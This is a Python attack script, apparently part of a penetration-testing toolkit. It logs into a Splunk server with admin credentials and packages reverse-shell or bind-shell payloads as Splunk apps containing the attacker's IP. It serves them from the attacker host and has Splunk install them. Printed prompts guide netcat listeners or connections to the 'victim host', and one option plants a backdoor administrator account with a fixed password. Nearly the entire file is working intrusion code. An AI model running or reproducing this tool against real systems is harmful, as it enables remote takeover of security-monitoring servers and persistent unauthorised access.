#!/usr/bin/env python3

# Install Reverse Shell or Bind Shell from App

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import sys, os
import http.server
import socketserver
from http.server import SimpleHTTPRequestHandler
from http.server import HTTPServer
import threading
import getpass
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from xml.etree import ElementTree
import splunklib.binding as binding
import socket
import tarfile
import colorama
from colorama import Fore, Style

#%%%%%%%%%%% Constants %%%%%%%%%%%#

separator = "[*] ============================================================================================================== [*]"

#%%%%%%%%%%% Functions %%%%%%%%%%%#

def installapp(splunkServer,appname):

    print(separator)
    splunkUsername = input("[!] Enter Splunk Admin (Default admin): ")
    splunkPassword = getpass.getpass("[!] Enter Password: ")
    localIP = input("[!] Enter your local IP address: ")

    context = binding.connect(
        host=splunkServer,
        port="8089",
        username=splunkUsername,
        password=splunkPassword)

    response = context.get('apps/local')
    if response.status != 200:
        raise Exception("%d (%s)" % (response.status, response.reason))

    body = response.body.read()
    data = ElementTree.XML(body)
    apps = data.findall("{http://www.w3.org/2005/Atom}entry/{http://www.w3.org/2005/Atom}title")

    print(separator)
    print("[!] List of Installed Apps:")
    print(separator)

    for app in apps:
        print("[*] "+app.text)
    print(separator)

    basedir = os.path.dirname(os.path.abspath(__file__))
    if (appname == "rshell.tar.gz"):  # linux python reverse shell
        relpath = 'rshell/bin/reverse_shell.py'

        with open(os.path.join(basedir, 'reverse_shell_original.py')) as f: #replace the attackerip
            newText = f.read().replace('REPLACEME',str(localIP))
        with open(os.path.join(basedir, relpath), "w+") as f:
            f.write(newText)
        with tarfile.open(os.path.join(basedir,'rshell.tar.gz'), "w:gz") as tar:
            tar.add(os.path.join(basedir,'rshell'),arcname='rshell')

    if (appname == "wrshell.tar.gz"):  # windows python reverse shell
        relpath = 'wrshell/bin/reverse_shell_win.py'

        with open(os.path.join(basedir, 'reverse_shell_win_original.py')) as f: #replace the attackerip
            newText = f.read().replace('REPLACEME',str(localIP))
        with open(os.path.join(basedir, relpath), "w+") as f:
            f.write(newText)
        with tarfile.open(os.path.join(basedir,'wrshell.tar.gz'), "w:gz") as tar:
            tar.add(os.path.join(basedir,'wrshell'),arcname='wrshell')

    os.chdir(basedir)
    PORT = 9337
    server = HTTPServer(('', PORT), SimpleHTTPRequestHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    try:
        thread.start()
    except KeyboardInterrupt:
        server.shutdown()
        sys.exit(0)

    if (appname != "None"):

        apptgz='http://'+localIP+':'+str(PORT)+'/'+appname
        response2 = context.post('apps/local', filename='true', name=apptgz)
        if response2.status != 201:  # 201 is the success code
            raise Exception("%d (%s)" % (response2.status, response2.reason))

        body2 = response2.body.read()
        data2 = ElementTree.XML(body2)
        results = data2.findall("{http://www.w3.org/2005/Atom}entry/{http://www.w3.org/2005/Atom}title")

        for result in results:
            print(separator)
            print("[!] Application Successfully Installed "+Fore.RED+Style.BRIGHT+result.text)
            print(separator)
            server.shutdown()
            if (appname == "rshell.tar.gz" or appname == "wrshell.tar.gz"): #reverse shells
                print(Fore.RED + Style.BRIGHT + "[!] Please start a listener on the attacker host port 12345, for example: nc -lvp 12345")
            if (appname == "bshell.tar.gz" or appname == "wbshell.tar.gz" or appname == "wbshellexe.tar.gz"): #bind shells
                print(Fore.RED + Style.BRIGHT + "[!] Please connect to the victim host on port 12346, for example: nc -v " + splunkServer + " 12346")
            if (appname == "wadduser.tar.gz"): #windows adduser
                print(Fore.RED + Style.BRIGHT + "[!] Administrator user added on the victim host "+ splunkServer +", user: siemadmin with password: siemadmin123$")
            print(separator)

    else:
        print("[!] Error with the app selection [!]")

#%%%%%%%%%% The End %%%%%%%%%%#
